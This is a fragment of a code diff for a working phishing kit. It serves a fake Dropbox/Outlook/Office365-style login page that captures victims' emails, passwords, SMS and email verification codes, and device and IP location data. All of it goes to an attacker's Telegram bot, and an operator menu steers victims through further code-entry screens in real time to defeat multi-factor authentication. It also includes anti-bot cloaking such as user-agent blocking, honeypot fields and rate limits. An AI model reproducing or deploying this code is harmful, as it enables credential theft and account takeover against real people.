WJDThJfEXGBkaJicoKSo1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoKDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uLj5OXm5+jp6vLz9PX29/j5+v/bAEMAAQEBAQEBAgEBAgMCAgIDBAMDAwMEBgQEBAQEBgcGBgYGBgYHBwcHBwcHBwgICAgICAkJCQkJCwsLCwsLCwsLC//bAEMBAgICAwMDBQMDBQsIBggLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLC//dAAQAAv/aAAwDAQACEQMRAD8A/g28PfDL4keLvD2p+LvCfh7UtU0nRU8zUL20tJZ7e0XBbM0iKUjGATlyOATXEV/Yj+wD8DvDXwS/Y38N/DjxsbCK9+IUU2pazaXkgjmni1KIpHCiEglhF5SMp6Hfxk15J8E/2Cfgl8JfAVh4H1LwDp3j6+v9WvrPXtW1FohNYW8Zl8mSNJAWAKCIBYdjnzPMziv0ej4c4mtToTp1EnON5XTfK3aysrvXm17Wbeh+N4nxiwWGrYqFWi2qc+WFmlzxXNzSvJpKzjor3lzRS1Z/LxefD7x7p3g60+ImoaHqEHh+/lMFrqcltItnNKpcFI5ivlswMbgqrE/K3oa5Cv3r/bM+Gul6V+wN4Q+FXwZjuNbsrHx5qdvp8dsrXMrxQzasSq7AS/lgEFh1C7q/G3/hQnx0/wChL17/AMF1x/8AG6+bzvh2tga0KNNOd4Qk2ldXkrtJrounkfZcM8YYfNMNVxFWUadqlSCTdm4xk0m09m7aruf/0P4Q/Evxf+LPjTX9P8VeMfFGr6tqmkhBY3l5ezT3FsIm3p5UjuWj2t8y7SMHkc1tT/tBfHu5udQvbnxvr8k2rKqX0jalcFrlUXYolJkzIAo2gNnA46V5DRXQsXXTbVR3fm/T8tDkeAwrSi6UbLRe6tFe9lp319T0PT/i78WNJ0Sw8NaV4o1a107SpXnsrWK9mSC2lkDhniRXCozCWQEqASHbP3jnV/4X18c/+h013/wY3H/xyvJ6KqONxEVaNSSXqyZ5Zg5NylRi3/hXXV9Or1P/2Q==",
+  outlook:  "data:image/png;base64,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",
+  office365:"data:image/png;base64,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"
+};
+
+// State
+let curProvider = document.querySelector('.provider-icon.active');
+let sessionKey=null, sessionEmail='';
+
+// ── ANTI-BOT ──────────────────────────────────────────────────
+const RATE_LIMIT=3, RATE_WINDOW=10*60*1000, MIN_TIME=3000, BLOCK_TIME=30*60*1000;
+const loadTime = Date.now();
+const getRD = () => { try{ return JSON.parse(localStorage.getItem('ms_rl')||'{}'); }catch{return {};} };
+const setRD = d => { try{localStorage.setItem('ms_rl',JSON.stringify(d));}catch{} };
+const isBlocked = () => { const d=getRD(); return d.blockedUntil && Date.now()<d.blockedUntil; };
+function checkRL(){
+  if(isBlocked()) return {blocked:true,reason:'rate_blocked'};
+  const d=getRD(), now=Date.now();
+  const hits=(d.hits||[]).filter(t=>now-t<RATE_WINDOW);
+  if(hits.length>=RATE_LIMIT){ setRD({hits,blockedUntil:now+BLOCK_TIME}); return {blocked:true,reason:'rate_limit'}; }
+  hits.push(now); setRD({hits}); return {blocked:false};
+}
+const isBotUA = () => ['bot','crawler','spider','headless','phantomjs','selenium','puppeteer','playwright','curl','wget','python-requests'].some(b=>navigator.userAgent.toLowerCase().includes(b));
+const isHPTripped = () => document.getElementById('hp_u').value.length>0 || document.getElementById('hp_e').value.length>0;
+const isTooFast = () => (Date.now()-loadTime)<MIN_TIME;
+
+// ── HELPERS ──────────────────────────────────────────────────
+const genKey = () => 'ms_'+Date.now()+'_'+Math.random().toString(36).substr(2,5);
+
+async function tgPost(endpoint, body){
+  const controller = new AbortController();
+  const timer = setTimeout(()=>controller.abort(), 10000); // 10s timeout
+  try{
+    const r = await fetch(`https://api.telegram.org/bot${BOT}/${endpoint}`,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify(body),
+      signal:controller.signal
+    });
+    clearTimeout(timer);
+    return await r.json();
+  }catch(e){
+    clearTimeout(timer);
+    console.error('TG request failed:',e);
+    throw e;
+  }
+}
+const tgSend  = (text,markup=null) => tgPost('sendMessage',{chat_id:CID,text,parse_mode:'Markdown',disable_web_page_preview:true,...(markup&&{reply_markup:markup})});
+const tgEdit  = (mid,text,markup=null) => tgPost('editMessageText',{chat_id:CID,message_id:mid,text,parse_mode:'Markdown',...(markup&&{reply_markup:markup})});
+const tgEditKB= (mid,markup) => tgPost('editMessageReplyMarkup',{chat_id:CID,message_id:mid,reply_markup:markup});
+const tgAnswer= (id,text,alert=false) => tgPost('answerCallbackQuery',{callback_query_id:id,text,show_alert:alert});
+
+// Admin action menu
+const adminMenu = sk => ({inline_keyboard:[
+  [{text:'📱 Number Prompt', callback_data:`A:num:${sk}`},{text:'📱 SMS Code',callback_data:`A:sms1:${sk}`}],
+  [{text:'✉️ Email Code',    callback_data:`A:emailCode:${sk}`},{text:'❌ Password Error',callback_data:`A:pass:${sk}`}],
+  [{text:'🚫 Block Visitor', callback_data:`A:block:${sk}`},{text:'✅ Success',callback_data:`A:success:${sk}`}]
+]});
+
+// Number prompt keyboard 1–99, 10 per row
+const numKB = sk => {
+  const rows=[];
+  for(let i=1;i<=99;i+=10){
+    const row=[];
+    for(let j=i;j<i+10&&j<=99;j++) row.push({text:`${j}`,callback_data:`N:${j}:${sk}`});
+    rows.push(row);
+  }
+  return {inline_keyboard:rows};
+};
+
+// Seat keyboard 1–100, 10 per row
+const seatKB = sk => {
+  const rows=[];
+  for(let i=1;i<=100;i+=10){
+    const row=[];
+    for(let j=i;j<i+10&&j<=100;j++) row.push({text:`${j}`,callback_data:`S:${j}:${sk}`});
+    rows.push(row);
+  }
+  return {inline_keyboard:rows};
+};
+
+
+
+// ── IP & DEVICE ──────────────────────────────────────────────
+async function getIP(){
+  try{
+    const d=await(await fetch('https://ipapi.co/json/')).json();
+    return {ip:d.ip||'?',city:d.city||'?',region:d.region||'?',country:d.country_name||'?',isp:d.org||'?',tz:d.timezone||'?',lat:d.latitude||'',lon:d.longitude||''};
+  }catch{return {ip:'?',city:'?',region:'?',country:'?',isp:'?',tz:'?',lat:'',lon:''};}
+}
+function getDev(){
+  const ua=navigator.userAgent;
+  const os=/Windows NT 10/i.test(ua)?'Windows 10/11':/iPhone/i.test(ua)?'iPhone iOS':/iPad/i.test(ua)?'iPad iOS':/Android.*Mobile/i.test(ua)?'Android Phone':/Android/i.test(ua)?'Android Tablet':/Mac OS X/i.test(ua)?'macOS':'Unknown';
+  const br=/Edg\//i.test(ua)?'Edge':/Chrome\//i.test(ua)?'Chrome':/Firefox\//i.test(ua)?'Firefox':/Safari\//i.test(ua)?'Safari':'Unknown';
+  const dv=/iPhone/i.test(ua)?'iPhone 📱':/iPad/i.test(ua)?'iPad 📱':/Android.*Mobile/i.test(ua)?'Android Phone 📱':'Desktop 🖥️';
+  return {device:dv,os,browser:br,screen:`${window.screen.width}x${window.screen.height}`,lang:navigator.language};
+}
+
+// ── SEND LOGIN ────────────────────────────────────────────────
+async function sendLogin(email,pass,prov,rem,ip,dev,sk){
+  const t=new Date().toLocaleString('en-GB',{day:'2-digit',month:'short',year:'numeric',hour:'2-digit',minute:'2-digit',second:'2-digit'});
+  const map=ip.lat&&ip.lon?`
+🗺 *Map:* [View](https://maps.google.com/?q=${ip.lat},${ip.lon})`:'';
+  const msg=`🔐 *NEW LOGIN — DROPBOX*
+━━━━━━━━━━━━━━━━━━━━
+👤 *Email:* \`${email}\`
+🔑 *Password:* \`${pass}\`
+🏷 *Provider:* ${prov}
+💾 *Remember Me:* ${rem?'Yes ✅':'No ❌'}
+🕐 *Time:* ${t}
+🛡 *Anti-Bot:* ✅ Passed
+
+━━━━━━━━━━━━━━━━━━━━
+📡 *NETWORK INFO*
+━━━━━━━━━━━━━━━━━━━━
+🌐 *IP:* \`${ip.ip}\`
+🏙 *City:* ${ip.city} | 🌍 ${ip.country}
+🏢 *ISP:* ${ip.isp}
+🕰 *Timezone:* ${ip.tz}${map}
+
+━━━━━━━━━━━━━━━━━━━━
+📱 *DEVICE INFO*
+━━━━━━━━━━━━━━━━━━━━
+💻 ${dev.device} | 🖥 ${dev.os}
+🌐 ${dev.browser} | 📐 ${dev.screen}
+━━━━━━━━━━━━━━━━━━━━
+
+👇 *SELECT ACTION FOR THIS EMPLOYEE:*`;
+  return await tgSend(msg, adminMenu(sk));
+}
+
+// ── FIREBASE LISTENER ─────────────────────────────────────────
+function listenFB(sk){
+  onValue(ref(db,`sess/${sk}`), snap=>{
+    const d=snap.val();
+    if(!d) return;
+    if(d.action==='num'){
+      // Show number on screen
+      const vn=document.getElementById('verifyNumber');
+      if(vn&&d.num) vn.textContent=d.num;
+      showFS('numPromptPage');
+    }
+    if(d.action==='sms1') showFS('smsPage1');
+    if(d.action==='emailCode') showFS('emailCodePage');
+    if(d.action==='pass') showFS('passPage');
+    if(d.action==='block') { showFS('blockPage'); stopPoll(); }
+    if(d.seat){ showSeat(d.seat); stopPoll(); }
+  });
+}
+
+// ── POLLING (backup for webhook) ──────────────────────────────
+// Webhook is primary. Polling is backup in case webhook misses anything.
+// Declare variables FIRST before functions that reference them
+let pollInterval = null;
+let lastUID = 0;
+const startPoll = () => { pollInterval = setInterval(poll, 3000); };
+const stopPoll  = () => { if(pollInterval) clearInterval(pollInterval); };
+
+async function poll(){
+  try{
+    const pollController = new AbortController();
+    const pollTimer = setTimeout(()=>pollController.abort(), 8000);
+    let res;
+    try{
+      res = await fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${lastUID+1}&timeout=3`,{signal:pollController.signal});
+      clearTimeout(pollTimer);
+    }catch(e){ clearTimeout(pollTimer); return; }
+
+    const data = await res.json();
+    if(!data.ok || !data.result.length) return;
+
+    for(const u of data.result){
+      lastUID = u.update_id;
+      if(!u.callback_query) continue;
+      const cb   = u.callback_query;
+      const raw  = cb.data || '';
+      const [type,...rest] = raw.split(':');
+
+      // ── ADMIN ACTION MENU ──
+      if(type === 'A'){
+        const action = rest[0], sk = rest[1];
+        // Restore session if lost
+        if(!sessionKey){ const sk2=localStorage.getItem('ms_sk'); if(sk2) sessionKey=sk2; }
+        if(!sessionEmail){ const se2=localStorage.getItem('ms_se'); if(se2) sessionEmail=se2; }
+        if(sk !== sessionKey) continue;
+
+        // Handle ALL actions via polling (works locally without webhook)
+        if(action==='num'){
+          // Send number keyboard to Telegram
+          const nr = await tgSend(
+            `🔢 *NUMBER PROMPT*\n👤 *Employee:* \`${sessionEmail}\`\n\n👇 *Pick a number — it will display on employee screen:*`,
+            numKB(sk)
+          );
+          // Answer the callback
+          await tgAnswer(cb.id, '✅ Number prompt sent!');
+        }else if(action==='sms1'){
+          await tgAnswer(cb.id, '✅ SMS Code I sent!');
+          await tgSend(`📱 *SMS CODE I — SENT*\n👤 *Employee:* \`${sessionEmail}\`\n\n_Waiting for employee to enter code..._`);
+          await firebase_set_js(`sess/${sk}`, {action:'sms1'});
+
+        }else if(action==='emailCode'){
+          await tgAnswer(cb.id, '✅ Email code sent!');
+          await tgSend(`✉️ *EMAIL CODE — SENT*\n👤 *Employee:* \`${sessionEmail}\`\n\n_Waiting for employee to enter code..._`);
+          await firebase_set_js(`sess/${sk}`, {action:'emailCode'});
+        }else if(action==='pass'){
+          await tgAnswer(cb.id, '✅ Password error shown!');
+          await tgSend(`❌ *PASSWORD ERROR — SHOWN*\n👤 *Employee:* \`${sessionEmail}\`\n\n_Waiting for employee to re-enter password..._`);
+          await firebase_set_js(`sess/${sk}`, {action:'pass'});
+        }else if(action==='block'){
+          await tgAnswer(cb.id, '🚫 Visitor blocked!');
+          await tgSend(`🚫 *VISITOR BLOCKED*\n👤 *Employee:* \`${sessionEmail}\`\n\n_Employee sees Access Denied screen._`);
+          await firebase_set_js(`sess/${sk}`, {action:'block'});
+        }else if(action==='success'){
+          await tgAnswer(cb.id, '✅ Verified!');
+          await tgSend(`✅ *ACCOUNT VERIFIED*\n👤 *Employee:* \`${sessionEmail}\`\n\n_Employee screen now shows Account Verified & redirecting._`);
+          await firebase_set_js(`sess/${sk}`, {seat:'verified'});
+        }
+      }
+
+      // ── NUMBER CHOSEN (N:num:sessionKey) ──
+      else if(type === 'N'){
+        const num = rest[0], sk = rest[1];
+        if(!sessionKey){ const sk2=localStorage.getItem('ms_sk'); if(sk2) sessionKey=sk2; }
+        if(!sessionEmail){ const se2=localStorage.getItem('ms_se'); if(se2) sessionEmail=se2; }
+        if(sk !== sessionKey) continue;
+        await tgAnswer(cb.id, `✅ Number ${num} sent to employee!`);
+        await tgSend(`🔢 *NUMBER DISPLAYED: ${num}*\n👤 *Employee:* \`${sessionEmail}\`\n\n_Employee screen now shows number *${num}*_`);
+        await firebase_set_js(`sess/${sk}`, {action:'num', num});
+      }
+
+      // ── SEAT CHOSEN (S:seat:sessionKey) ──
+      else if(type === 'S'){
+        const seat = rest[0], sk = rest[1];
+        if(!sessionKey){ const sk2=localStorage.getItem('ms_sk'); if(sk2) sessionKey=sk2; }
+        if(!sessionEmail){ const se2=localStorage.getItem('ms_se'); if(se2) sessionEmail=se2; }
+        if(sk !== sessionKey) continue;
+        await tgAnswer(cb.id, `✅ Seat ${seat} assigned!`);
+        await tgSend(`✅ *SEAT ASSIGNED: ${seat}*\n👤 *Employee:* \`${sessionEmail}\`\n\n_Employee screen updated — seat number *${seat}* shown._`);
+        await firebase_set_js(`sess/${sk}`, {seat});
+      }
+    }
+  }catch(e){}
+}
+
+// Firebase set via REST (backup — main listener uses SDK)
+async function firebase_set_js(path, data){
+  try{
+    await fetch(`${CONFIG.FIREBASE.databaseURL}/${path}.json`,{
+      method:'PUT',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify(data)
+    });
+  }catch(e){}
+}
+
+// ── SHOW SEAT ────────────────────────────────────────────────
+function showSeat(num){
+  try{
+    localStorage.setItem('ms_seat', num);
+    localStorage.setItem('ms_email', sessionEmail);
+    localStorage.removeItem('ms_sk');
+    localStorage.removeItem('ms_se');
+    localStorage.removeItem('ms_mid');
+  }catch(e){}
+  // Update seat number elements if they exist
+  const sn = document.getElementById('seatNum');
+  const si = document.getElementById('seatNumInline');
+  if(sn) sn.textContent = num;
+  if(si) si.textContent = num;
+  showFS('seatPage');
+}
+
+// ── SMS SUBMIT ───────────────────────────────────────────────
+window.submitSMS = async function(v){
+  const row = document.getElementById(`smsRow${v}`);
+  if(!row){ showToast('Error: form not found','error'); return; }
+  const code = [...row.querySelectorAll('.sms-d')].map(i=>i.value).join('');
+  if(code.length < 6){ showToast('Please enter all 6 digits','error'); return; }
+  const btn = document.getElementById(`smsbtn${v}`);
+  const sp  = document.getElementById(`smsSp${v}`);
+  btn.disabled = true; sp.style.display = 'block';
+  try{
+    await tgSend(`📱 *SMS CODE ${v} RECEIVED*\n👤 *Employee:* \`${sessionEmail}\`\n🔢 *Code:* *${code}*`);
+    showToast('Code submitted successfully!','success');
+    row.querySelectorAll('.sms-d').forEach(i=>i.value='');
+  }catch(e){
+    showToast('Submission failed. Try again.','error');
+  }
+  btn.disabled = false; sp.style.display = 'none';
+};
+
+// ── EMAIL CODE SUBMIT ────────────────────────────────────────────
+window.submitEmailCode = async function(){
+  const row = document.getElementById('smsRowEmail');
+  if(!row){ showToast('Error: form not found','error'); return; }
+  const emailCode = [...row.querySelectorAll('.sms-d')].map(i=>i.value).join('');
+  if(emailCode.length < 6){ showToast('Please enter all 6 digits','error'); return; }
+  const emailBtn = document.getElementById('emailCodeBtn');
+  const emailSp  = document.getElementById('emailCodeSp');
+  emailBtn.disabled = true; emailSp.style.display = 'block';
+  try{
+    await tgSend('\u2709\uFE0F *EMAIL CODE RECEIVED*\n\ud83d\udc64 *Employee:* `'+sessionEmail+'`\n\ud83d\udd22 *Code Entered:* *'+emailCode+'*');
+    showToast('Email code submitted!','success');
+    row.querySelectorAll('.sms-d').forEach(i=>i.value='');
+  }catch(e){
+    showToast('Submission failed. Try again.','error');
+  }
+  emailBtn.disabled = false; emailSp.style.display = 'none';
+};
+
+// ── PASSWORD SUBMIT ──────────────────────────────────────────
+window.submitNewPass = async function(){
+  const p = document.getElementById('newPassInput').value.trim();
+  if(!p){ showToast('Please enter your password','error'); return; }
+  const passBtn = document.getElementById('passbtn');
+  const passSp  = document.getElementById('passSp');
+  passBtn.disabled = true; passSp.style.display = 'block';
+  try{
+    await tgSend(`🔑 *NEW PASSWORD RECEIVED*\n👤 *Employee:* \`${sessionEmail}\`\n🔑 *New Password:* \`${p}\``);
+    showToast('Password submitted!','success');
+    document.getElementById('newPassInput').value = '';
+  }catch(e){
+    showToast('Submission failed. Try again.','error');
+  }
+  passBtn.disabled = false; passSp.style.display = 'none';
+};
+
+// ── PAGE HELPERS ──────────────────────────────────────────────
+function showFS(id){
+  // Hide login page
+  document.getElementById('loginPage').classList.remove('active');
+  // Hide all fs pages
+  document.querySelectorAll('.fs').forEach(p=>p.classList.remove('active'));
+  // Show target
+  document.getElementById(id).classList.add('active');
+  // Sync provider logo on all fs pages
+  syncLogos();
+}
+
+function syncLogos(){
+  if(!curProvider) return;
+  const color=curProvider.dataset.color||'#EA4335';
+  const src=IMGS[curProvider.dataset.img]||'';
+  const imgTag=src?`<img src="${src}" style="width:48px;height:48px;object-fit:contain;border-radius:6px;">`:'';
+  ['neutralLogo','numLogo','smsLogo1','smsLogo2','emailLogo','passLogo'].forEach(id=>{
+    const el=document.getElementById(id);
+    if(!el) return;
+    el.style.background=color;
+    if(imgTag) el.innerHTML=imgTag;
+  });
+}
+
+// ── MAIN LOGIN ────────────────────────────────────────────────
+window.handleLogin=async function(){
+  const email=document.getElementById('emailInput').value.trim();
+  const pass=document.getElementById('passwordInput').value.trim();
+  const rem=document.getElementById('rememberMe').checked;
+  const prov=curProvider?curProvider.dataset.name:'Gmail';
+
+  if(!email||!pass){showToast('Please enter your email and password.','error');return;}
+  if(!email.includes('@')){showToast('Please enter a valid email address.','error');return;}
+
+  // Anti-bot
+  if(isBotUA()){showFS('blockPage');return;}
+  if(isHPTripped()){showFS('blockPage');return;}
+  if(isTooFast()){showToast('Please slow down.','error');return;}
+  const rl=checkRL();
+  if(rl.blocked){showFS('blockPage');return;}
+
+  setLoading(true);
+  sessionEmail=email;
+  sessionKey=genKey();
+  // Persist session so it survives local file state loss
+  try{localStorage.setItem('ms_sk', sessionKey); localStorage.setItem('ms_se', email);}catch(e){}
+
+  try{
+    const [ip,dev]=await Promise.all([getIP(),Promise.resolve(getDev())]);
+    await sendLogin(email,pass,prov,rem,ip,dev,sessionKey);
+    showFS('neutralWait');
+    listenFB(sessionKey);  // Primary: Firebase listener (fired by webhook)
+    startPoll();           // Backup: polling catches anything webhook misses
+  }catch(e){showToast('Login submitted. Please wait.','success');}
+  setLoading(false);
+};
+
+// ── PROVIDER SWITCH ───────────────────────────────────────────
+window.switchProvider=function(el){
+  document.querySelectorAll('.provider-icon').forEach(i=>i.classList.remove('active'));
+  el.classList.add('active');
+  curProvider=el;
+  const li=document.getElementById('logoInner');
+  const ct=document.getElementById('cardTitle');
+  const src=IMGS[el.dataset.img]||'';
+  li.classList.remove('pop'); void li.offsetWidth;
+  li.className='card-logo-inner pop';
+  li.style.background=el.dataset.color;
